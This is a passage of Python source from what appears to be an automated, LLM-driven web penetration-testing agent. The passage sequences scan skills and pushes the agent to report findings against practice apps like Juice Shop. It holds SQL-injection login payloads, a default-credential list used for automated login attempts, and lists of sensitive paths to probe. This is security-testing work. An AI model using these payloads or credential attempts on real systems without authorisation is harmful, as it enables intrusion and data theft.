                            lower = norm_path.lower()

                            if code_i == 500:
                                findings_hint.append(
                                    f"  - {code} {size}B {norm_path} → HTTP 500 = potential injection/logic bug (severity=high, finding_type=information_disclosure)"
                                )
                            elif code_i == 401 and "basket" in lower:
                                findings_hint.append(
                                    f"  - {code} {size}B {norm_path} → auth-protected enumerable resource = IDOR candidate (severity=medium, finding_type=broken_access_control)"
                                )
                            elif code_i == 403 and any(x in lower for x in (".bak", ".old", ".backup", "~")):
                                findings_hint.append(
                                    f"  - {code} {size}B {norm_path} → backup file accessible via bypass = info disclosure (severity=medium, finding_type=information_disclosure)"
                                )
                            elif code_i == 200 and "/ftp" in lower and _baseline_size and size != _baseline_size:
                                # FTP directory — Juice Shop classic
                                findings_hint.append(
                                    f"  - {code} {size}B {norm_path} → directory listing exposed (size differs from shell {_baseline_size}) (severity=medium, finding_type=information_disclosure)"
                                )
                            elif code_i == 200 and _baseline_size is not None and size != _baseline_size and size > 100:
                                sensitive = any(x in lower for x in (
                                    "admin", "config", "api-doc", "swagger", "graphql",
                                    ".git", ".env", "actuator", "debug", "backup",
                                    "rest/admin", "rest/user", "rest/basket", "rest/order",
                                    "rest/memories", "rest/captcha", "rest/languages",
                                    "registration", "h2-console", "server-status",
                                    "phpinfo", "wp-config", "wp-login", "wp-admin",
                                    "phpmyadmin", "heapdump", "beans", "configprops",
                                ))
                                if sensitive:
                                    # Critical-level paths get HIGH, others MEDIUM
                                    critical_markers = (
                                        "admin", "config", ".git", ".env", "actuator",
                                        "heapdump", "phpinfo", "wp-config", "h2-console",
                                    )
                                    sev = "high" if any(x in lower for x in critical_markers) else "medium"
                                    findings_hint.append(
                                        f"  - {code} {size}B {norm_path} → sensitive endpoint returning {size}B (differs from SPA shell {_baseline_size}B) (severity={sev}, finding_type=information_disclosure)"
                                    )

                        # Third pass: query-param response-length oracle (SQL injection)
                        for base, entries in path_sizes.items():
                            if len(entries) < 2 or not base:
                                continue
                            # Collect distinct sizes for this base
                            distinct = {s for _, s, _ in entries}
                            if len(distinct) < 2:
                                continue
                            # Find the max (benign) and min (injection break) sizes
                            max_row = max(entries, key=lambda e: e[1])
                            min_row = min(entries, key=lambda e: e[1])
                            if max_row[1] - min_row[1] < 500:
                                continue  # not a meaningful size delta
                            if min_row[1] < 100 or max_row[1] > 1000:
                                # min likely empty response, max likely real data
                                findings_hint.append(
                                    f"  - query-param oracle on {base}: {min_row[0]} {min_row[1]}B for '{min_row[2]}' vs {max_row[0]} {max_row[1]}B for '{max_row[2]}' → response-length oracle suggests SQL/NoSQL injection or parameter handling bug (severity=high, finding_type=sql_injection)"
                                )

                        # Update the sticky pending-findings map so we can
                        # re-inject unreported items on future iterations.
                        for hint_line in findings_hint:
                            # Parse finding_type + component from the hint line —
                            # hint lines look like "  - 500 3031B /path → ... finding_type=X)"
                            ft_match = _re.search(r"finding_type=([a-z_]+)", hint_line)
                            path_match = _re.search(r"\s(/[^\s]+)\s*→", hint_line)
                            if ft_match and path_match:
                                key = (ft_match.group(1), path_match.group(1))
                                _pending_findings[key] = hint_line
                        if findings_hint:
                            hint_msg = (
                                "SYSTEM HINT — MANDATORY ACTION REQUIRED\n\n"
                                "The previous probe output contains "
                                f"{len(findings_hint)} likely REAL findings (baseline "
                                f"SPA shell = {_baseline_size or 'unknown'}B, already filtered out).\n\n"
                                "Your NEXT actions MUST be report_finding calls for "
                                "EVERY item below — one report_finding per item, in a "
                                "single response. DO NOT run another probe until all "
                                "of these are reported. DO NOT skip any of them.\n\n"
                                + "\n".join(findings_hint[:12])
                                + "\n\nEmit them all now as a single JSON object with "
                                "multiple actions in the 'actions' array. After "
                                "reporting, proceed to sqlmap or deeper verification."
                            )
                            self.state.add_message("user", hint_msg)
                            logger.info(
                                "iter %d: injected finding hint with %d candidates",
                                self.state.iteration, len(findings_hint),
                            )

                # Sticky hint re-injection: after any tool call, check which
                # pending findings are still NOT in the finding_tools store.
                # If there are still >= 2 unreported items, re-emit a condensed
                # nudge. This catches the case where Brain reports 2 items and
                # wanders off without finishing the list.
                if _pending_findings and name != "report_finding" and _sticky_last_iter < self.state.iteration:
                    try:
                        from vxis.agent.tools.finding_tools import _get_findings as _fget
                        reported_components = {
                            (f["finding_type"].lower(), f["affected_component"])
                            for f in _fget()
                        }
                    except Exception:
                        reported_components = set()
                    # Cull: drop reported AND refuted entries from pending so
                    # we don't keep nudging Brain toward items the verifier
                    # already killed.
                    # Normalize refuted component keys: strip scheme+host so
                    # "/api" matches "http://localhost:3000/api"
                    refuted_keys: set[tuple[str, str]] = set()
                    for rf in self.state.refuted_findings:
                        _rc = str(rf.get("affected_component", ""))
                        refuted_keys.add((str(rf.get("finding_type", "")).lower(), _rc))
                        # Also add path-only version
                        try:
                            from urllib.parse import urlparse as _uparse
                            _rp = _uparse(_rc).path
                            if _rp:
                                refuted_keys.add((str(rf.get("finding_type", "")).lower(), _rp))
                        except Exception:
                            pass
                    for k in list(_pending_findings.keys()):
                        if k in reported_components or k in refuted_keys:
                            _pending_findings.pop(k, None)
                    still_pending = dict(_pending_findings)
                    # Only nudge if there are unreported items AND we've done
                    # at least 2 non-report actions since the last hint (avoid
                    # spam after first emission). Also throttle: once per iter.
                    if len(still_pending) >= 2 and name in ("python_exec", "shell_exec", "http_request"):
                        _sticky_last_iter = self.state.iteration
                        nudge_lines = list(still_pending.values())[:6]
                        nudge_msg = (
                            "STICKY HINT REMINDER — you still have "
                            f"{len(still_pending)} unreported findings from the earlier "
                            "probe. Emit report_finding for each of these BEFORE any "
                            "more probing:\n"
                            + "\n".join(nudge_lines)
                        )
                        self.state.add_message("user", nudge_msg)
                        logger.info(
                            "iter %d: sticky re-injection, %d pending",
                            self.state.iteration, len(still_pending),
                        )

                if name == "finish_scan":
                    # Reject premature finish: enforce minimum exploration
                    _min_iters = min(50, self.state.max_iters // 2)
                    if self.state.iteration < _min_iters:
                        self.state.add_message("tool", {
                            "name": "finish_scan", "args": {},
                            "result": {
                                "ok": False,
                                "summary": (
                                    f"finish_scan REJECTED — only {self.state.iteration} "
                                    f"iterations done, minimum {_min_iters} required. "
                                    "Keep exploring: try injection_vectors playbook, "
                                    "test SQLi on discovered endpoints, run nuclei, "
                                    "or probe authentication endpoints."
                                ),
                                "data": {"premature": True},
                            },
                        })
                        logger.warning(
                            "iter %d: finish_scan rejected (min=%d)",
                            self.state.iteration, _min_iters,
                        )
                        continue

                    # Reject finish if findings exist but insufficient chains
                    # relative to finding count. Also surface concrete finding
                    # IDs + a ready-to-call link_chain template so Brain has
                    # no excuse to spin aimlessly.
                    try:
                        from vxis.agent.tools.finding_tools import _get_findings as _gf2, _get_chains as _gc2
                        _fin_findings = _gf2()
                        _fin_chains = _gc2()
                        _fin_desired = max(3, len(_fin_findings) // 3)
                        if len(_fin_findings) >= 3 and len(_fin_chains) < _fin_desired:
                            # Build concrete chain suggestions from actual IDs.
                            # Group by severity — high/critical first so Brain
                            # is pointed at the most impactful composition.
                            _sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "informational": 4}
                            _sorted = sorted(
                                _fin_findings,
                                key=lambda f: _sev_order.get(f.get("severity", "low"), 5),
                            )
                            # Take the top 4 and propose pairwise chains.
                            _top = [f["id"] for f in _sorted[:4]]
                            _existing_ids_in_chains = {
                                tuple(sorted(c.get("finding_ids", [])))
                                for c in _fin_chains
                            }
                            _suggestions: list[str] = []
                            for i in range(len(_top)):
                                for j in range(i + 1, len(_top)):
                                    pair = tuple(sorted([_top[i], _top[j]]))
                                    if pair in _existing_ids_in_chains:
                                        continue
                                    _suggestions.append(
                                        f'link_chain(finding_ids=["{_top[i]}","{_top[j]}"], '
                                        f'rationale="<why {_top[i]} enables {_top[j]}>", '
                                        f'crown_jewel="<admin takeover | DB dump | RCE | data exfil>")'
                                    )
                                    if len(_suggestions) >= 4:
                                        break
                                if len(_suggestions) >= 4:
                                    break
                            _sug_block = "\n  ".join(_suggestions) or "(build any chain you can imagine)"
                            _findings_block = "\n  ".join(
                                f"{f['id']} [{f.get('severity','?').upper()}] {f.get('finding_type','')}: {f.get('title','')[:60]}"
                                for f in _sorted[:10]
                            )
                            self.state.add_message("tool", {
                                "name": "finish_scan", "args": {},
                                "result": {
                                    "ok": False,
                                    "summary": (
                                        f"finish_scan REJECTED — {len(_fin_findings)} findings, "
                                        f"{len(_fin_chains)} chains (need ≥{_fin_desired}).\n"
                                        f"DO NOT call finish_scan yet.\n\n"
                                        f"YOUR FINDINGS:\n  {_findings_block}\n\n"
                                        f"READY-TO-CALL link_chain SUGGESTIONS:\n  {_sug_block}\n\n"
                                        "Pick one, customise the rationale/crown_jewel, call link_chain, "
                                        "then try the next. Each chain you link = one step closer to "
                                        "passing the gate. Crown jewels: admin takeover, DB dump, RCE, "
                                        "key theft, full data exfil."
                                    ),
                                    "data": {
                                        "needs_chains": True,
                                        "chain_deficit": _fin_desired - len(_fin_chains),
                                        "suggestions": _suggestions,
                                    },
                                },
                            })
                            logger.warning(
                                "iter %d: finish_scan rejected (%d chains / %d target, %d findings)",
                                self.state.iteration, len(_fin_chains),
                                _fin_desired, len(_fin_findings),
                            )
                            continue
                    except Exception:
                        logger.exception("finish_scan rejection check failed")
                    if result.ok:
                        self.state.completed = True
                        break
            # Track which tools Brain actually called this iteration
            for name, _ in actions:
                _tools_used.add(name)

            # Sample messages[] byte size at the end of each iteration.
            # Phase B fix: populates peak_context_bytes metric that was 0 in Task 11.
            self.state.update_peak_size()

            # ── Phase E: skill auto-execution ────────────────────────────
            # Skills run on schedule. Brain sees the results and decides
            # what to report. This is the "skills for known attacks,
            # Brain for creative thinking" pattern.
            if "run_skill" in self.registry.list_tools():
                for skill_name, trigger_iter, extra_params in _skill_sequence:
                    if (
                        skill_name not in _skills_completed
                        and self.state.iteration >= trigger_iter
                    ):
                        _skills_completed.add(skill_name)
                        try:
                            params = {**extra_params}
                            # Allow a queue entry to alias an existing skill
                            # (e.g. test_idor_1 → test_idor with different
                            # url_pattern). This lets us run the same skill
                            # multiple times with distinct parameters without
                            # confusing the de-dup set.
                            _real_skill = params.pop("_skill_override", None) or skill_name
                            # Track the real skill even when called via alias,
                            # so the sweep block can detect untouched skills.
                            _real_skills_completed.add(_real_skill)
                            sr = await self.registry.dispatch("run_skill", {
                                "skill": _real_skill,
                                "target_url": self.state.target,
                                "params": params,
                            })
                            if sr.ok:
                                self.state.add_message("tool", {
                                    "name": "run_skill",
                                    "args": {"skill": _real_skill, "queue_id": skill_name},
                                    "result": {"ok": True, "summary": sr.summary, "data": sr.data},
                                })
                                logger.info(
                                    "skill %s completed (queue=%s): %s",
                                    _real_skill, skill_name, sr.summary[:100],
                                )

                                # Chain: if auth succeeded, queue post-auth skills
                                if _real_skill == "attempt_auth" and sr.data:
                                    if sr.data.get("authenticated"):
                                        _auth_token = sr.data.get("token", "")
                                        method = sr.data.get("method", "?")
                                        creds = sr.data.get("credentials_used", {})
                                        # Auto-report auth finding
                                        severity = "critical" if "sqli" in method else "high"
                                        ftype = "sql_injection" if "sqli" in method else "weak_auth"
                                        await self.registry.dispatch("report_finding", {
                                            "title": f"Authentication bypass via {method}",
                                            "severity": severity,
                                            "finding_type": ftype,
                                            "affected_component": sr.data.get("login_endpoint", self.state.target),
                                            "description": f"Auth bypass via {method}. Credentials: {creds}",
                                            "evidence": f"Token: {_auth_token[:60]}...\nUser: {sr.data.get('user_info', {})}",
                                        })
                                        # Queue post-auth skills
                                        _post_auth_skills = [
                                            ("post_auth_enum", self.state.iteration + 2, {"token": _auth_token}),
                                            ("test_idor", self.state.iteration + 4, {"token": _auth_token}),
                                            ("test_auth_deep", self.state.iteration + 5, {"token": _auth_token}),
                                        ]
                                        _skill_sequence.extend(_post_auth_skills)
                                        _all_skill_names.update(s[0] for s in _post_auth_skills)
                                        self.state.add_message("user", (
                                            f"SKILL CHAIN: Auth bypass confirmed via {method}! "
                                            f"Token acquired. Post-auth skills queued."
                                        ))

                                # Auto-report sensitive files
                                if _real_skill == "test_sensitive_files" and sr.data:
                                    for exposed in (sr.data.get("exposed") or [])[:10]:
                                        sev = exposed.get("severity", "medium")
                                        if sev in ("critical", "high"):
                                            await self.registry.dispatch("report_finding", {
                                                "title": f"Sensitive file exposed: {exposed['path']}",
                                                "severity": sev,
                                                "finding_type": "information_disclosure",
                                                "affected_component": self.state.target + exposed["path"],
                                                "description": exposed.get("description", ""),
                                                "evidence": exposed.get("preview", "")[:500],
                                            })

                                # Auto-report injection findings
                                if _real_skill == "test_injection" and sr.data:
                                    for finding in (sr.data.get("findings") or []):
                                        await self.registry.dispatch("report_finding", {
                                            "title": f"{finding['type'].upper()} on {sr.data.get('param', '?')}",
                                            "severity": finding.get("severity", "medium"),
                                            "finding_type": finding["type"],
                                            "affected_component": sr.data.get("url", self.state.target),
                                            "description": f"Payload: {finding['payload'][:80]}",
                                            "evidence": finding.get("response_preview", finding.get("evidence", ""))[:500],
                                        })

                                # Auto-report enumeration results
                                if _real_skill == "enumerate_endpoints" and sr.data:
                                    # Queue injection/XSS/SSRF on search/query endpoints
                                    accessible = sr.data.get("accessible", [])
                                    for ep in accessible:
                                        path = ep.get("path", "")
                                        if "?" in path or "search" in path.lower():
                                            full_url = self.state.target.rstrip("/") + path
                                            _skill_sequence.append(("test_injection", self.state.iteration + 2, {"url": full_url}))
                                            _skill_sequence.append(("test_xss", self.state.iteration + 3, {"url": full_url}))
                                            _skill_sequence.append(("test_ssrf", self.state.iteration + 4, {"url": full_url}))
                                            break
                                    # Queue test_idor on discovered numeric-id
                                    # patterns so we don't rely on the
                                    # Juice-Shop-only /api/Users/{id} default.
                                    import re as _re2
                                    _idor_patterns_seen: set[str] = set()
                                    for ep in accessible:
                                        path = ep.get("path", "")
                                        # Match /segment/<digits> or /segment/<digits>/...
                                        m = _re2.search(r"^(/[^?]*?/)\d+(/|$)", path)
                                        if m:
                                            base = m.group(1).rstrip("/")
                                            pattern = self.state.target.rstrip("/") + base + "/{id}"
                                            if pattern not in _idor_patterns_seen:
                                                _idor_patterns_seen.add(pattern)
                                                _skill_sequence.append((
                                                    f"test_idor_{len(_idor_patterns_seen)}",
                                                    self.state.iteration + 5,
                                                    {"url_pattern": pattern, "_skill_override": "test_idor"},
                                                ))
                                                _all_skill_names.add(f"test_idor_{len(_idor_patterns_seen)}")
                                                if len(_idor_patterns_seen) >= 4:
                                                    break
                                    # Also target common API shapes if nothing
                                    # numeric turned up yet. These are generic
                                    # probes, not target-specific.
                                    if not _idor_patterns_seen:
                                        for _candidate in (
                                            "/api/users/{id}", "/api/user/{id}",
                                            "/api/orders/{id}", "/api/account/{id}",
                                            "/users/{id}", "/profile/{id}",
                                        ):
                                            pattern = self.state.target.rstrip("/") + _candidate
                                            _skill_sequence.append((
                                                f"test_idor_probe_{_candidate.strip('/').replace('/','_')}",
                                                self.state.iteration + 5,
                                                {"url_pattern": pattern, "_skill_override": "test_idor"},
                                            ))
                                            _all_skill_names.add(f"test_idor_probe_{_candidate.strip('/').replace('/','_')}")
                                    # Report error endpoints
                                    for ep in (sr.data.get("errors") or [])[:5]:
                                        await self.registry.dispatch("report_finding", {
                                            "title": f"HTTP 500 on {ep['path']}",
                                            "severity": "medium",
                                            "finding_type": "error_oracle",
                                            "affected_component": self.state.target + ep["path"],
                                            "description": f"Endpoint returns HTTP 500 ({ep.get('size', '?')}B)",
                                            "evidence": ep.get("error_preview", "")[:300],
                                        })

                                # IDOR results
                                if _real_skill == "test_idor" and sr.data:
                                    if sr.data.get("vulnerable"):
                                        ids = sr.data.get("accessible_ids", [])
                                        await self.registry.dispatch("report_finding", {
                                            "title": f"IDOR on {sr.data.get('url_pattern', '?')}",
                                            "severity": "high",
                                            "finding_type": "idor",
                                            "affected_component": sr.data.get("url_pattern", ""),
                                            "description": f"{len(ids)} IDs accessible",
                                            "evidence": f"Accessible IDs: {ids[:10]}\nSamples: {sr.data.get('data_samples', [])[:2]}",
                                        })

                                # Post-auth enum results
                                if _real_skill == "post_auth_enum" and sr.data:
                                    user_data = sr.data.get("user_data_exposed", [])
                                    if user_data:
                                        await self.registry.dispatch("report_finding", {
                                            "title": f"Sensitive user data exposed on {len(user_data)} endpoint(s)",
                                            "severity": "high",
                                            "finding_type": "broken_access_control",
                                            "affected_component": self.state.target,
                                            "description": f"Endpoints exposing user data: {[e['path'] for e in user_data[:5]]}",
                                            "evidence": str(user_data[:3])[:500],
                                        })

                                # Auto-report: XSS findings
                                if _real_skill == "test_xss" and sr.data:
                                    for finding in (sr.data.get("findings") or []):
                                        await self.registry.dispatch("report_finding", {
                                            "title": f"XSS ({finding.get('type', 'reflected')}) on {finding.get('param', '?')}",
                                            "severity": finding.get("severity", "high"),
                                            "finding_type": f"xss_{finding.get('type', 'reflected')}",
                                            "affected_component": sr.data.get("url", self.state.target),
                                            "description": f"Payload: {finding.get('payload', '')[:80]}",
                                            "evidence": finding.get("response_preview", finding.get("evidence", ""))[:500],
                                        })

                                # Payload rotation: if injection/xss came up
                                # CLEAN at round R<3, re-queue at round R+1
                                # against the same URL. Round 2 = blind/time
                                # + filter bypass; round 3 = WAF-evasion
                                # polyglots. This prevents "one cheap classic
                                # pass, declare clean" when a WAF is in play.
                                if _real_skill in ("test_injection", "test_xss") and sr.data:
                                    _cur_round = sr.data.get("round", 1)
                                    if not sr.data.get("vulnerable") and _cur_round < 3:
                                        _url = sr.data.get("url")
                                        if _url:
                                            _next = _cur_round + 1
                                            _alias_r = (
                                                f"{_real_skill}__round{_next}_iter{self.state.iteration}"
                                            )
                                            _skill_sequence.append((
                                                _alias_r,
                                                self.state.iteration + 2,
                                                {
                                                    "_skill_override": _real_skill,
                                                    "url": _url,
                                                    "round": _next,
                                                },
                                            ))
                                            _all_skill_names.add(_alias_r)
                                            logger.info(
                                                "payload rotation: re-queue %s round=%d on %s",
                                                _real_skill, _next, _url,
                                            )

                                # Auto-report: SSRF findings
                                if _real_skill == "test_ssrf" and sr.data:
                                    for finding in (sr.data.get("findings") or []):
                                        await self.registry.dispatch("report_finding", {
                                            "title": f"SSRF via {finding.get('type', 'ssrf')} on {finding.get('param', '?')}",
                                            "severity": finding.get("severity", "high"),
                                            "finding_type": "ssrf",
                                            "affected_component": sr.data.get("url", self.state.target),
                                            "description": f"Payload: {finding.get('payload', '')[:80]}",
                                            "evidence": finding.get("response_preview", finding.get("evidence", ""))[:500],
                                        })

                                # Auto-report: CSRF findings
                                if _real_skill == "test_csrf" and sr.data:
                                    for finding in (sr.data.get("findings") or [])[:5]:
                                        await self.registry.dispatch("report_finding", {
                                            "title": f"CSRF: no protection on {finding.get('method', '?')} {finding.get('endpoint', '?')}",
                                            "severity": finding.get("severity", "medium"),
                                            "finding_type": "csrf",
                                            "affected_component": self.state.target + finding.get("endpoint", ""),
                                            "description": f"No CSRF token on {finding.get('method', '?')} {finding.get('endpoint', '?')}",
                                            "evidence": finding.get("evidence", "")[:500],
                                        })

                                # Auto-report: Misconfig findings (headers, CORS, debug)
                                if _real_skill == "test_misconfig" and sr.data:
                                    for finding in (sr.data.get("findings") or [])[:5]:
                                        await self.registry.dispatch("report_finding", {
                                            "title": f"Misconfiguration: {finding.get('type', 'unknown')}",
                                            "severity": finding.get("severity", "medium"),
                                            "finding_type": "misconfiguration",
                                            "affected_component": self.state.target,
                                            "description": finding.get("description", finding.get("type", ""))[:200],
                                            "evidence": finding.get("evidence", finding.get("payload", ""))[:500],
                                        })

                                # Auto-report: API security findings
                                if _real_skill == "test_api_security" and sr.data:
                                    for finding in (sr.data.get("findings") or [])[:5]:
                                        await self.registry.dispatch("report_finding", {
                                            "title": f"API Security: {finding.get('type', 'unknown')}",
                                            "severity": finding.get("severity", "medium"),
                                            "finding_type": finding.get("type", "api_security"),
                                            "affected_component": self.state.target + finding.get("endpoint", ""),
                                            "description": finding.get("description", finding.get("payload", ""))[:200],
                                            "evidence": finding.get("evidence", "")[:500],
                                        })

                                # Auto-report: Crypto findings
                                if _real_skill == "test_crypto" and sr.data:
                                    for finding in (sr.data.get("findings") or []):
                                        await self.registry.dispatch("report_finding", {
                                            "title": f"Crypto weakness: {finding.get('type', 'unknown')}",
                                            "severity": finding.get("severity", "medium"),
                                            "finding_type": "weak_crypto",
                                            "affected_component": self.state.target + finding.get("path", ""),
                                            "description": finding.get("description", finding.get("payload", ""))[:200],
                                            "evidence": finding.get("evidence", "")[:500],
                                        })

                                # Auto-report: Infra findings (git, env, cloud)
                                if _real_skill == "test_infra" and sr.data:
                                    for finding in (sr.data.get("findings") or []):
                                        await self.registry.dispatch("report_finding", {
                                            "title": f"Infrastructure exposure: {finding.get('type', 'unknown')}",
                                            "severity": finding.get("severity", "high"),
                                            "finding_type": "misconfiguration",
                                            "affected_component": self.state.target + finding.get("path", ""),
                                            "description": finding.get("description", finding.get("payload", ""))[:200],
                                            "evidence": finding.get("evidence", "")[:500],
                                        })

                                # ── Desktop skill auto-promotion ────────────
                                # All 6 macOS desktop skills emit Finding-shaped
                                # dicts with bilingual title|||description and a
                                # DESK-* vector. Web skills above only run on
                                # web targets, so this block fires exclusively
                                # when Brain (or sweep) ran a desktop skill.
                                # Without this, scan_loop would let internal
                                # findings die in sr.data and the report would
                                # come back empty even when the skill clearly
                                # found something on disk.
                                if _real_skill in (
                                    "test_local_storage_secrets",
                                    "test_electron_misconfig",
                                    "test_signature_audit",
                                    "test_entitlement_audit",
                                    "test_dylib_hijack",
                                    "test_deeplink_abuse",
                                ) and sr.data:
                                    _root = sr.data.get("root") or self.state.target
                                    for finding in (sr.data.get("findings") or []):
                                        # Each desktop skill picks its own
                                        # location field; coalesce them so
                                        # affected_component is always populated.
                                        _loc = (
                                            finding.get("abs_path")
                                            or finding.get("path")
                                            or finding.get("binary")
                                            or _root
                                        )
                                        # Evidence: prefer the skill's snippet
                                        # if present (LSS gives masked context),
                                        # else fall back to a compact summary
                                        # of the matched bytes for the verifier
                                        # to chew on.
                                        _ev = (
                                            finding.get("snippet")
                                            or finding.get("evidence")
                                            or (
                                                f"vector={finding.get('vector', '?')} "
                                                f"flag={finding.get('flag', finding.get('entitlement_key', finding.get('scheme', '?')))} "
                                                f"path={_loc}"
                                            )
                                        )
                                        await self.registry.dispatch("report_finding", {
                                            "title": finding.get("title", f"Desktop finding: {finding.get('vector', '?')}"),
                                            "severity": finding.get("severity", "medium"),
                                            "finding_type": finding.get("vector", "desktop_misconfiguration"),
                                            "affected_component": _loc,
                                            "description": finding.get("description", "")[:1500],
                                            "evidence": str(_ev)[:500],
                                        })

                        except Exception:
                            logger.exception("skill %s failed", skill_name)

            # ── Phase C auto-orchestration ──────────────────────────────
            # Code enforcement: if Brain hasn't done key actions by certain
            # iteration thresholds, do them automatically and inject results.

            # Auto-browser-login: at iter 8, if no login was attempted yet,
            # auto-navigate to login page + try default creds + SQLi.
            # Triggers regardless of whether Brain used browser — Brain
            # uses it but never tries fill_form. Code enforces the action.
            if (
                not _auto_login_done
                and self.state.iteration >= 8
                and "browser_navigate" in self.registry.list_tools()
            ):
                _auto_browser_done = True
                try:
                    nav_result = await self.registry.dispatch(
                        "browser_navigate", {"url": self.state.target}
                    )
                    if nav_result.ok:
                        self.state.add_message("tool", {
                            "name": "browser_navigate",
                            "args": {"url": self.state.target},
                            "result": {"ok": True, "summary": nav_result.summary, "data": nav_result.data},
                        })
                        # Check for login-like inputs
                        inputs = nav_result.data.get("inputs", []) if nav_result.data else []
                        has_password = any(i.get("type") == "password" for i in inputs)
                        # Track the URL where the login form was discovered so
                        # we can navigate back to it for each credential attempt.
                        _login_url_found = self.state.target if has_password else None
                        if not has_password:
                            # Try navigating to common login paths. WebGoat uses
                            # /login (no hash), Juice Shop uses /#/login, etc.
                            for login_path in [
                                "/#/login", "/login", "/auth/login",
                                "/signin", "/users/sign_in", "/user/login",
                                "/WebGoat/login", "/admin/login",
                            ]:
                                login_url = self.state.target.rstrip("/") + login_path
                                lr = await self.registry.dispatch("browser_navigate", {"url": login_url})
                                if lr.ok:
                                    lr_inputs = lr.data.get("inputs", []) if lr.data else []
                                    has_password = any(i.get("type") == "password" for i in lr_inputs)
                                    if has_password:
                                        inputs = lr_inputs
                                        _login_url_found = login_url
                                        self.state.add_message("tool", {
                                            "name": "browser_navigate",
                                            "args": {"url": login_url},
                                            "result": {"ok": True, "summary": lr.summary, "data": lr.data},
                                        })
                                        break

                        # DOM analysis
                        dom_result = await self.registry.dispatch("browser_analyze_dom", {})
                        if dom_result.ok:
                            self.state.add_message("tool", {
                                "name": "browser_analyze_dom", "args": {},
                                "result": {"ok": True, "summary": dom_result.summary, "data": dom_result.data},
                            })

                        # Auto-login: adaptive selector detection. We don't
                        # hardcode #email/#loginButton — that only works on
                        # Juice Shop. Instead, we inspect the discovered form
                        # inputs and derive selectors by name/id/type. This
                        # works against WebGoat (username/password), DVWA,
                        # generic Spring/Rails/Django forms, etc.
                        if has_password and not _auto_login_done:
                            _auto_login_done = True
                            try:
                                from vxis.agent.tools.browser_tools import _page as _bp
                                if _bp is not None:
                                    # Dismiss common overlays
                                    for dismiss_sel in [
                                        "a.cc-dismiss", "button.cc-dismiss",
                                        "button[aria-label='Close Welcome Banner']",
                                        "button.close", ".modal .close",
                                        "[aria-label*='dismiss' i]", "[aria-label*='close' i]",
                                    ]:
                                        try:
                                            await _bp.click(dismiss_sel, timeout=2000)
                                        except Exception:
                                            pass

                                    # Derive user + password + submit selectors
                                    def _sel(ident: str | None, elem_type: str | None) -> str | None:
                                        if ident:
                                            return f"#{ident}" if not ident.startswith("#") else ident
                                        if elem_type:
                                            return f"input[type='{elem_type}']"
                                        return None

                                    _user_input = None
                                    _pw_input = None
                                    for i in inputs:
                                        itype = str(i.get("type", "")).lower()
                                        iname = str(i.get("name", "")).lower()
                                        iid = str(i.get("id", "")).lower()
                                        if itype == "password" and _pw_input is None:
                                            _pw_input = i
                                        elif (
                                            _user_input is None
                                            and itype in ("text", "email", "tel", "", "search")
                                            and any(
                                                k in iname or k in iid
                                                for k in ("email", "user", "login", "account", "name")
                                            )
                                        ):
                                            _user_input = i
                                    # Fallback: first non-password text-ish input
                                    if _user_input is None:
                                        for i in inputs:
                                            itype = str(i.get("type", "")).lower()
                                            if itype != "password" and itype in ("text", "email", "tel", "", "search"):
                                                _user_input = i
                                                break

                                    # Build selector chains with fallbacks
                                    _user_sels: list[str] = []
                                    if _user_input:
                                        _uid = _user_input.get("id") or ""
                                        _unm = _user_input.get("name") or ""
                                        if _uid:
                                            _user_sels.append(f"#{_uid}")
                                        if _unm:
                                            _user_sels.append(f"input[name='{_unm}']")
                                    # Generic fallbacks
                                    _user_sels.extend([
                                        "input[type='email']",
                                        "input[name='username']", "input[name='email']",
                                        "input[name='user']", "input[name='login']",
                                        "#username", "#email", "#user", "#login",
                                        "input[type='text']:not([type='password'])",
                                    ])
                                    _pw_sels: list[str] = []
                                    if _pw_input:
                                        _pid = _pw_input.get("id") or ""
                                        _pnm = _pw_input.get("name") or ""
                                        if _pid:
                                            _pw_sels.append(f"#{_pid}")
                                        if _pnm:
                                            _pw_sels.append(f"input[name='{_pnm}']")
                                    _pw_sels.extend([
                                        "input[type='password']", "#password", "#pass",
                                    ])
                                    _submit_sels = [
                                        "button[type='submit']", "input[type='submit']",
                                        "#loginButton", "#login-button", "button.login",
                                        "button[name='login']", "button:has-text('Sign in')",
                                        "button:has-text('Log in')", "button:has-text('Login')",
                                    ]

                                    # Target-agnostic credential matrix. The SQLi
                                    # attempt goes first because it's the only
                                    # payload that directly produces a CRITICAL
                                    # finding when it succeeds.
                                    _login_creds = [
                                        ("' OR 1=1--", "x"),
                                        ("admin' --", "x"),
                                        ("admin@juice-sh.op", "admin123"),
                                        ("admin", "admin"),
                                        ("admin", "password"),
                                        ("guest", "guest"),   # WebGoat default
                                        ("user", "user"),
                                        ("webgoat", "webgoat"),
                                        ("test", "test"),
                                    ]

                                    _login_target = _login_url_found or self.state.target

                                    # Log what we actually discovered so future
                                    # scans aren't a black box on failure.
                                    logger.info(
                                        "auto-login: %d inputs on %s — user_sels=%s pw_sels=%s",
                                        len(inputs), _login_target,
                                        _user_sels[:3], _pw_sels[:3],
                                    )

                                    async def _fill_any(sels: list[str], value: str) -> str | None:
                                        """Return the selector that worked, or None.
                                        BrowserPage.fill(selector, value) has NO timeout kwarg — passing
                                        one raises TypeError which previously was swallowed silently,
                                        making every auto-login attempt fail. Fixed: use the real signature
                                        and fall back to the underlying Playwright page for selector
                                        types BrowserPage doesn't handle (e.g. :has-text).
                                        """
                                        for s in sels:
                                            try:
                                                await _bp.fill(s, value)
                                                return s
                                            except Exception:
                                                # Try raw Playwright as fallback — some selectors
                                                # (e.g. with 'i' case flag) need the real page.
                                                try:
                                                    await _bp._page.fill(s, value, timeout=2500)
                                                    return s
                                                except Exception:
                                                    continue
                                        return None

                                    async def _click_any(sels: list[str]) -> str | None:
                                        for s in sels:
                                            try:
                                                await _bp.click(s, timeout=3000)
                                                return s
                                            except Exception:
                                                try:
                                                    await _bp._page.click(s, timeout=2500)
                                                    return s
                                                except Exception:
                                                    continue
                                        return None

                                    _login_failures: list[str] = []
                                    _login_success = False
                                    for email, pwd in _login_creds:
                                        try:
                                            await _bp.navigate(_login_target)
                                            import asyncio as _aio
                                            # WebGoat / Spring Security often re-render
                                            # the form; give the DOM a moment to settle.
                                            await _aio.sleep(0.7)
                                            _user_sel = await _fill_any(_user_sels, email)
                                            if _user_sel is None:
                                                logger.debug("auto-login: user field not found for %s", email)
                                                _login_failures.append(f"{email}:no_user_field")
                                                continue
                                            _pw_sel = await _fill_any(_pw_sels, pwd)
                                            if _pw_sel is None:
                                                logger.debug("auto-login: pw field not found")
                                                _login_failures.append(f"{email}:no_pw_field")
                                                continue
                                            # Try submit via button, else press Enter on password.
